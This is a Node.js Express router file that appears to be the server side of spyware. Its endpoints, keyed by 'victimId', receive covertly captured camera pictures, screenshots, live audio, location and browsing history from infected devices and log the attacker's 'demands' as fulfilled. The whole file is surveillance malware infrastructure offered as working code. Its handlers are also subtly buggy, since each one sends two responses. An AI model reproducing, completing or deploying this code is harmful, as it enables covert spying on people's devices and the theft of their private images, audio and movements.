import { Router } from "express";
import Victim from '../models/victimModel.js';
import Request from '../models/requestModel.js';
import multer from 'multer';

const router = Router();
const upload = multer({ dest: 'uploads/' })


router.route('/cameraPicture/:victimId')
    .post(upload.single('img'), (req, res) => {
        console.log('Camera picture received:', req.file);
        const victimId = req.params.victimId;
        Request.findOneAndUpdate({victimId: victimId, demand: 'cameraPicture'}, {fulfilled: true, fulfilledAt: req.file.destination}).then((doc) => {
            res.json(doc);
        }).catch((err) => {
            res.status(400).json(err);
        });
        res.status(200).send('Camera picture uploaded successfully.');
    });

router.route('/screenshot/:victimId')
    .post(upload.single('img'), (req, res) => {
        console.log('Screenshot received:', req.file);
        const victimId = req.params.victimId;
        Request.findOneAndUpdate({victimId: victimId, demand: 'screenshot'}, {fulfilled: true, fulfilledAt: req.file.destination}).then((doc) => {
            res.json(doc);
        }).catch((err) => {
            res.status(400).json(err);
        });
        res.status(200).send('Screenshot uploaded successfully.');
    });

router.route('/liveAudio/:victimId')
    .post(upload.single('audio'), (req, res) => {
        console.log('Live audio received:', req.file);
        const victimId = req.params.victimId;
        Request.findOneAndUpdate({victimId: victimId, demand: 'liveAudio'}, {fulfilled: true, fulfilledAt: req.file.destination}).then((doc) => {
            res.json(doc);
        }).catch((err) => {
            res.status(400).json(err);
        });
        res.status(200).send('Live audio uploaded successfully.');
    });

router.route('/location/:victimId')
    .post((req, res) => {
        const location = req.body.location;
        console.log('Location received:', location);
        const victimId = req.params.victimId;
        Request.findOneAndUpdate({victimId: victimId, demand: 'location'}, {fulfilled: true, fulfilledAt: location}).then((doc) => {
            res.json(doc);
        }).catch((err) => {
            res.status(400).json(err);
        });
        res.status(200).send('Location received successfully.');
    });

router.route('/history/:victimId')
    .post(upload.single('csv'), (req, res) => {
        console.log('CSV history received:', req.file);
        const victimId = req.params.victimId;
        Request.findOneAndUpdate({victimId: victimId, demand: 'history'}, {fulfilled: true, fulfilledAt: req.file.destination}).then((doc) => {
            res.json(doc);
        }).catch((err) => {
            res.status(400).json(err);
        });
        res.status(200).send('CSV history uploaded successfully.');
    });

router.route('/health')
    .get((req, res) => {
        res.send('OK');
    });
    
export default router;